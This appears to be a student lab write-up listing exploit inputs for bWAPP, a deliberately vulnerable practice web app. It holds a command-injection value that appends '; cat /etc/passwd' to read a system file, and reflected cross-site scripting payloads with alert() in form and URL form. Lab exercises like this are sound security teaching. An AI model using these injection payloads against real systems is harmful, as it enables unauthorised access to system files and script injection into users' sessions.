# bWAPP - Exploits
<a href="https://github.com/NicolaiKuertoes/swa-writeups/tree/master/swa_prakt6#swa---praktikum-6">&larr; zurück</a>
### (1) OS Command Injection (low)
```bash
; cat /etc/passwd
```

### (2) OS Command Injection-Blind (low)
```bash
not yet implemented
```

### (3) Cross-Site Scripting - Reflected (GET) (low)
```JS
// Input 1:
"Hacker"
// Input 2:
"<script>alert("XSS")</script>"
// Payload:
"?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit"
```

### (4) Cross-Site Scripting - Reflected (POST) (low)
```JS
// Input 1:
"Hacker"
// Input 2:
"<script>alert("XSS")</script>"
// Payload:
"?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit"
```
